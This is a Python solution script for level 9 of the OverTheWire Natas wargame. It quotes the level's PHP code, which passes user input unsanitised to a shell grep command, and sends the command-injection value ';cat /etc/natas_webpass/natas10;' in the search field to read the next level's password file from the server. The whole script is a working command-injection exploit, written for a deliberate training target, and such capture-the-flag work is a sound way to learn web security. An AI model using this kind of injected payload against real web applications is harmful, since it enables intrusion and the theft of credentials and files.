import requests

import natas8
from helpers import between


def solution() -> str:
    url = "http://natas9.natas.labs.overthewire.org"
    username = "natas9"
    password = natas8.solution()

    # From "View sourcecode" link:
    # if($key != "") {
    #     passthru("grep -i $key dictionary.txt");
    # }

    needle = ";cat /etc/natas_webpass/natas10;"
    params = {"needle": needle, "submit": "Search"}
    r = requests.get(url, auth=(username, password), params=params)
    start = "<pre>\n"
    end = "\n</pre>"
    natas10_password = between(r.text, start, end)
    return natas10_password
